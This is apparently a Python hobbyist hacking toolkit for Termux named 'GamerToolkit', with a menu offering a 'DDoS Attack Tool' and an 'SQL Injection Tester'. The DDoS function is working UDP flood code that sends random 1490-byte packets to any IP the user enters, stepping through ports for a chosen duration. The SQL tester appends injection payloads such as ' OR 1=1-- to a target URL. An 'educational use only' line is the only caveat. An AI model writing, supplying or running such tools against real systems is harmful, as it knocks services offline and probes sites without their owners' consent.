#!/usr/bin/env python3
import os
import time
import socket
import random
import sys
import requests
from bs4 import BeautifulSoup

# ANSI Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"

def clear():
    os.system('clear')

def show_banner():
    clear()
    print(f"{RED}")
    os.system("figlet GamerToolkit")
    print(f"{RESET}")
    print(f"{CYAN}Created by: gameraazvb")
    print(f"Github: github.com/gameraazvb{RESET}")
    print(f"{YELLOW}Warning: For educational use only!{RESET}\n")

def ddos_attack():
    clear()
    print(f"{RED}")
    os.system("figlet DDoS Mode")
    print(f"{RESET}")
    
    try:
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        duration = int(input("Duration (seconds): "))
    except:
        print(f"\n{RED}Invalid input!{RESET}")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    timeout = time.time() + duration
    sent = 0

    print(f"\n{YELLOW}Attack started on {ip}:{port} for {duration} seconds{RESET}")
    
    try:
        while time.time() < timeout:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print(f"Sent {sent} packets", end='\r')
            port = port + 1 if port < 65534 else 1
        
        print(f"\n{GREEN}Attack completed!{RESET}")
    except Exception as e:
        print(f"\n{RED}Error: {e}{RESET}")

def sql_injection_test():
    clear()
    print(f"{BLUE}")
    os.system("figlet SQL Tester")
    print(f"{RESET}")
    
    url = input("Enter target URL (e.g., http://example.com/page.php?id=1): ")
    payloads = ["'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\""]
    
    print(f"\n{YELLOW}Testing for SQL vulnerabilities...{RESET}")
    
    try:
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                r = requests.get(test_url, timeout=5)
                if "error" in r.text.lower() or "sql" in r.text.lower():
                    print(f"{RED}Possible vulnerability found with payload: {payload}{RESET}")
                    soup = BeautifulSoup(r.text, 'html.parser')
                    error_text = soup.get_text()[:200]  # Show first 200 chars of response
                    print(f"{YELLOW}Server response:{RESET}\n{error_text}...\n")
                    return
            except:
                continue
        
        print(f"{GREEN}No obvious SQL vulnerabilities detected.{RESET}")
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

def menu():
    show_banner()
    print(f"{GREEN}1. DDoS Attack Tool")
    print(f"{BLUE}2. SQL Injection Tester")
    print(f"{RED}3. Exit{RESET}")
    
    try:
        choice = int(input("\nSelect an option: "))
        if choice == 1:
            ddos_attack()
        elif choice == 2:
            sql_injection_test()
        elif choice == 3:
            sys.exit()
        else:
            print(f"{RED}Invalid choice!{RESET}")
            time.sleep(1)
            menu()
    except:
        print(f"{RED}Invalid input!{RESET}")
        time.sleep(1)
        menu()

if __name__ == "__main__":
    # Check if running in Termux
    if not os.path.exists('/data/data/com.termux/files/home'):
        print(f"{RED}This script is designed for Termux!{RESET}")
        sys.exit(1)
    
    # Check requirements
    try:
        import requests
        import bs4
    except:
        print(f"{YELLOW}Installing required packages...{RESET}")
        os.system('pkg install python -y && pip install requests bs4')
    
    while True:
        menu()
        input("\nPress Enter to continue...")
